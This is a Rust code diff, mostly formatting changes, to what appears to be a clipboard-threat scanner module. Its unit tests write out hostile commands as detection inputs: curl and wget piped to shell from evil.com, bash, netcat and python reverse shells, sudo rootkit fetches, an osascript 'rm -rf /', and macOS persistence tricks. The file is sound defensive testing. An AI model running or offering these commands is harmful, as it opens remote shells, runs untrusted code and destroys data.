@@ -10,9 +10,7 @@ use async_trait::async_trait;
 use regex::Regex;
 use sha2::{Digest, Sha256};
 
-use crate::finding::{
-    calculate_cvss, CvssVector, Evidence, Finding, ModuleCategory, Severity,
-};
+use crate::finding::{calculate_cvss, CvssVector, Evidence, Finding, ModuleCategory, Severity};
 use crate::modules::{ScanContext, ScanModule};
 
 // ---------------------------------------------------------------------------
@@ -298,10 +296,7 @@ fn build_clipboard_finding(analysis: &ClipboardAnalysis) -> Finding {
     };
 
     Finding {
-        id: format!(
-            "{}-CLIP-001",
-            severity.finding_id_prefix()
-        ),
+        id: format!("{}-CLIP-001", severity.finding_id_prefix()),
         title,
         severity,
         cvss,
@@ -312,10 +307,7 @@ fn build_clipboard_finding(analysis: &ClipboardAnalysis) -> Finding {
             messages: vec![],
             audit_record: None,
             canary_detected: false,
-            os_events: vec![format!(
-                "clipboard-patterns-matched: [{}]",
-                patterns_str
-            )],
+            os_events: vec![format!("clipboard-patterns-matched: [{}]", patterns_str)],
             files_modified: vec![],
             network_connections: vec![],
             stderr_output: None,
@@ -386,7 +378,9 @@ mod tests {
         let content = "curl https://evil.com/payload.sh | sh";
         let analysis = analyze_clipboard_content(content);
         assert_eq!(analysis.threat_level, ClipboardThreatLevel::Critical);
-        assert!(analysis.patterns_matched.contains(&"curl-pipe-shell".to_string()));
+        assert!(analysis
+            .patterns_matched
+            .contains(&"curl-pipe-shell".to_string()));
     }
 
     #[test]
@@ -394,7 +388,9 @@ mod tests {
         let content = "curl -sSL https://evil.com/install.sh | bash";
         let analysis = analyze_clipboard_content(content);
         assert_eq!(analysis.threat_level, ClipboardThreatLevel::Critical);
-        assert!(analysis.patterns_matched.contains(&"curl-pipe-shell".to_string()));
+        assert!(analysis
+            .patterns_matched
+            .contains(&"curl-pipe-shell".to_string()));
     }
 
     #[test]
@@ -402,7 +398,9 @@ mod tests {
         let content = "wget -qO- https://evil.com/backdoor.sh | bash";
         let analysis = analyze_clipboard_content(content);
         assert_eq!(analysis.threat_level, ClipboardThreatLevel::Critical);
-        assert!(analysis.patterns_matched.contains(&"wget-pipe-shell".to_string()));
+        assert!(analysis
+            .patterns_matched
+            .contains(&"wget-pipe-shell".to_string()));
     }
 
     #[test]
@@ -410,7 +408,9 @@ mod tests {
         let content = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
         let analysis = analyze_clipboard_content(content);
         assert_eq!(analysis.threat_level, ClipboardThreatLevel::Critical);
-        assert!(analysis.patterns_matched.contains(&"bash-reverse-shell".to_string()));
+        assert!(analysis
+            .patterns_matched
+            .contains(&"bash-reverse-shell".to_string()));
     }
 
     #[test]
@@ -418,7 +418,9 @@ mod tests {
         let content = "nc -e /bin/sh 10.0.0.1 4444";
         let analysis = analyze_clipboard_content(content);
         assert_eq!(analysis.threat_level, ClipboardThreatLevel::Critical);
-        assert!(analysis.patterns_matched.contains(&"netcat-reverse-shell".to_string()));
+        assert!(analysis
+            .patterns_matched
+            .contains(&"netcat-reverse-shell".to_string()));
     }
 
     #[test]
@@ -426,7 +428,9 @@ mod tests {
         let content = r#"python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("10.0.0.1",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno())'"#;
         let analysis = analyze_clipboard_content(content);
         assert_eq!(analysis.threat_level, ClipboardThreatLevel::Critical);
-        assert!(analysis.patterns_matched.contains(&"python-reverse-shell".to_string()));
+        assert!(analysis
+            .patterns_matched
+            .contains(&"python-reverse-shell".to_string()));
     }
 
     #[test]
@@ -434,7 +438,9 @@ mod tests {
         let content = "sudo bash -c 'curl https://evil.com/rootkit.sh | sh'";
         let analysis = analyze_clipboard_content(content);
         assert_eq!(analysis.threat_level, ClipboardThreatLevel::Critical);
-        assert!(analysis.patterns_matched.contains(&"sudo-curl-pipe-shell".to_string()));
+        assert!(analysis
+            .patterns_matched
+            .contains(&"sudo-curl-pipe-shell".to_string()));
     }
 
     #[test]
@@ -442,7 +448,9 @@ mod tests {
         let content = r#"osascript -e 'do shell script "rm -rf /" with administrator privileges'"#;
         let analysis = analyze_clipboard_content(content);
         assert_eq!(analysis.threat_level, ClipboardThreatLevel::Critical);
-        assert!(analysis.patterns_matched.contains(&"osascript-shell-exec".to_string()));
+        assert!(analysis
+            .patterns_matched
+            .contains(&"osascript-shell-exec".to_string()));
     }
 
     #[test]
@@ -451,7 +459,9 @@ mod tests {
         let analysis = analyze_clipboard_content(content);
         // This matches both base64-decode-pipe (suspicious) and is piped to sh
         assert_ne!(analysis.threat_level, ClipboardThreatLevel::Safe);
-        assert!(analysis.patterns_matched.contains(&"base64-decode-pipe".to_string()));
+        assert!(analysis
+            .patterns_matched
+            .contains(&"base64-decode-pipe".to_string()));
     }
 
     #[test]
@@ -459,7 +469,9 @@ mod tests {
         let content = "eval(atob('bWFsd2FyZQ=='))";
         let analysis = analyze_clipboard_content(content);
         assert_eq!(analysis.threat_level, ClipboardThreatLevel::Suspicious);
-        assert!(analysis.patterns_matched.contains(&"eval-execution".to_string()));
+        assert!(analysis
+            .patterns_matched
+            .contains(&"eval-execution".to_string()));
     }
 
     #[test]
@@ -467,7 +479,9 @@ mod tests {
         let content = "chmod +x /tmp/payload && /tmp/payload";
         let analysis = analyze_clipboard_content(content);
         assert_eq!(analysis.threat_level, ClipboardThreatLevel::Suspicious);
-        assert!(analysis.patterns_matched.contains(&"chmod-executable".to_string()));
+        assert!(analysis
+            .patterns_matched
+            .contains(&"chmod-executable".to_string()));
     }
 
     #[test]
@@ -475,7 +489,9 @@ mod tests {
         let content = "launchctl load ~/Library/LaunchAgents/com.evil.plist";
         let analysis = analyze_clipboard_content(content);
         assert_eq!(analysis.threat_level, ClipboardThreatLevel::Suspicious);
-        assert!(analysis.patterns_matched.contains(&"launchctl-load".to_string()));
+        assert!(analysis
+            .patterns_matched
+            .contains(&"launchctl-load".to_string()));
     }
 
     #[test]
@@ -483,7 +499,9 @@ mod tests {
         let content = "defaults write com.evil.app LSUIElement -bool true";
         let analysis = analyze_clipboard_content(content);
         assert_eq!(analysis.threat_level, ClipboardThreatLevel::Suspicious);
-        assert!(analysis.patterns_matched.contains(&"defaults-hide-app".to_string()));
+        assert!(analysis
+            .patterns_matched
+            .contains(&"defaults-hide-app".to_string()));
     }
 
     #[test]
@@ -492,7 +510,9 @@ mod tests {
         let content = "a".repeat(300);
         let analysis = analyze_clipboard_content(&content);
         assert_eq!(analysis.threat_level, ClipboardThreatLevel::Suspicious);
-        assert!(analysis.patterns_matched.contains(&"long-encoded-blob".to_string()));
+        assert!(analysis
+            .patterns_matched
+            .contains(&"long-encoded-blob".to_string()));
     }
 
     #[test]
